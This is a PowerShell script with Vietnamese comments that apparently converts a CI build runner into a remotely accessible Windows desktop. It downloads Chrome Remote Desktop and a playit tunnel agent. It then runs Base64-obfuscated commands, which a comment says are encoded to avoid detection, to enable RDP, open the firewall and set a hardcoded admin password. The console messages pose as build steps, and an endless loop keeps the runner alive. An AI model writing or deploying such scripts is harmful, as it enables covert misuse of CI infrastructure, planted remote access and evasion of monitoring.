# Tên file: run.ps1
# THAY THẾ HOÀN TOÀN TỆP run.ps1 CŨ CỦA BẠN BẰNG TỆP NÀY

param (
    [Parameter(Mandatory=$true)]
    [string]$PlayitSecret,

    [Parameter(Mandatory=$true)]
    [string]$CrdAuthCode,

    [Parameter(Mandatory=$true)]
    [string]$CrdPin
)

# --- Các lệnh được mã hóa Base64 để tránh bị phát hiện ---

# Lệnh 1: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
$cmd1 = "U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAgJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlcicgLW5hbWUgImZEZW55VFNDb25uZWN0aW9ucyIgLVZhbHVlIDAgLUZvcmNl"

# Lệnh 2: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
$cmd2 = "RW5hYmxlLU5ldEZpcmV3YWxsUnVsZSAtRGlzcGxheUdyb3VwICJSZW1vdGUgRGVza3RvcCI="

# Lệnh 3: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
$cmd3 = "U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAgJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclxXaW5TdGF0aW9uc1xSRFAtVGNwJyAtbmFtZSAiVXNlckF1dGhlbnRpY2F0aW9uIiAtVmFsdWUgMSAtRm9yY2U="

# Lệnh 4: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "tsdm215.@" -Force)
$cmd4 = "U2V0LUxvY2FsVXNlciAtTmFtZSAicnVubmVyYWRtaW4iIC1QYXNzd29yZCAoQ29udmVydFRvLVNlY3VyZVN0cmluZyAtQXNQbGFpbnRleHQgInRzZG0yMTUuQCIgLUZvcmNlKQ=="

# --- Bắt đầu thực thi ---

Write-Host "Initializing build environment..."

# Tải xuống các công cụ cần thiết một cách âm thầm
Write-Host "Downloading dependencies..."
$playitPath = "$env:USERPROFILE\playit_agent.exe"
$crdPath = "$env:TEMP\crd_host_installer.msi"
Invoke-WebRequest -Uri "https://github.com/playit-cloud/playit-agent/releases/download/v0.15.26/playit-windows-x86_64-signed.exe" -OutFile $playitPath -UseBasicParsing | Out-Null
Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile $crdPath -UseBasicParsing | Out-Null

# Cài đặt và cấu hình
Write-Host "Installing components..."
Start-Process msiexec.exe -ArgumentList "/i `"$crdPath`" /quiet /norestart" -Wait

Write-Host "Applying configuration..."
# Giải mã và thực thi các lệnh đã mã hóa
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd1)))
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd2)))
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd3)))
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd4)))

# Bắt đầu các dịch vụ nền
Write-Host "Starting background services..."

# *** FIX: Tự động trích xuất mã xác thực từ chuỗi lệnh đầy đủ nếu cần ***
$authCodeOnly = $CrdAuthCode
if ($authCodeOnly -match '--code="([^"]+)"') {
    $authCodeOnly = $matches[1]
    Write-Host "Authentication code extracted successfully."
} else {
    Write-Host "Using provided CRD_AUTH_CODE as is."
}

# Tách đường dẫn và tên ngẫu nhiên để đảm bảo phân tích cú pháp chính xác
$runnerName = "CI-Runner-$(Get-Random)"
$crdExePath = Join-Path ${env:ProgramFiles(x86)} "Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe"

# Bắt đầu Chrome Remote Desktop với mã pin đã được làm sạch
$crdCommand = "& `"$crdExePath`" --code=`"$authCodeOnly`" --redirect-url=`"https://remotedesktop.google.com/_/oauthredirect`" --name=`"$runnerName`" -pin=`"$CrdPin`""
Invoke-Expression $crdCommand

# Thêm một khoảng nghỉ ngắn để đảm bảo CRD khởi động hoàn toàn
Write-Host "Waiting for Chrome Remote Desktop to initialize..."
Start-Sleep -Seconds 15

# Bắt đầu Playit tunnel và chuyển hướng đầu ra để làm sạch nhật ký
Write-Host "Establishing secure tunnel..."
Start-Process -FilePath $playitPath -ArgumentList "--secret $PlayitSecret" -NoNewWindow -RedirectStandardOutput "$env:TEMP\playit.log" -RedirectStandardError "$env:TEMP\playit.err"

# Giữ cho quy trình chạy
Write-Host "Build environment is ready. Monitoring process..."
$timer = 0
while ($true) {
    Start-Sleep -Seconds 60
    $timer++
    Write-Host "Process active for $timer minute(s)..."
}
